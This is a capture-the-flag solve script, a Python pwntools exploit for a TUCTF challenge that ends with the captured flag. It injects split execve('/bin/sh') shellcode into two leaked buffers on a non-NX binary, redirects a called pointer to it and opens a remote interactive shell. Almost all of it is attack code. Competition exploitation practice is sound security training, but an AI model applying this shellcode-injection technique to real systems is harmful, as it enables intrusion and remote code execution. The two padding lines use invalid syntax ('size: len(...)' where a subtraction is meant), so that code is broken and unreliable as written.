Solved by Dan
#!/usr/bin/env python3.7
import pwn

# reverse the binary with r2, it's pretty simple
#  0x12 byte heap buffer, input copied into it
#  0x10 byte stack buffer, input copied into it
#  address of two buffers is printed
#  input copied into pointer
#  call pointer
#
# also NX is off

# just did pwn.shellcraft.sh() for my shellcode
# split it into two chunks, one fore 0x12 byte
# buffer and one for 0x10. Added a jmp eax
# between the two

# {} will be the address of buf_two once we
# know where it is
SHELLCODE_ONE = r'''
    /* push b'/bin///sh\x00' */
    push 0x68
    push 0x732f2f2f
    mov eax, {}
    jmp eax
'''

SHELLCODE_TWO = r'''
    push 0x6e69622f

    /* call execve('esp', 0, 0) */
    push (SYS_execve) /* 0xb */
    pop eax
    mov ebx, esp
    xor ecx, ecx
    cdq /* edx=0 */
    int 0x80
'''

pwn.context(os='linux', arch='x86')
# pwn.shellcraft.sh()
r = pwn.remote('chal.tuctf.com', 30504)
r.recvline()
r.recvline()

# address of buf one
buffer_one = int(r.recvline()[2:], 16)
buffer_one_size = 0x12

# address of buf two
buffer_two = int(r.recvline()[2:], 16)
buffer_two_size = 0x10

# format shellcode w/ buff two address
shellcode_one = pwn.asm(SHELLCODE_ONE.format(hex(buffer_two)))
shellcode_two = pwn.asm(SHELLCODE_TWO)

# send the shellcode in two parts, padded to full size of buffers with 'a'
r.send(shellcode_one + b'a' * (buffer_one_size: len(shellcode_one)))
r.send(shellcode_two + b'a' * (buffer_two_size: len(shellcode_two)))

# send the address of buf one
r.send(pwn.p32(buffer_one))

# cat flag*
r.interactive()

TUCTF{4nd_4_0n3,_4nd_4_7w0,_4nd_5h3ll_f0r_y0u!}

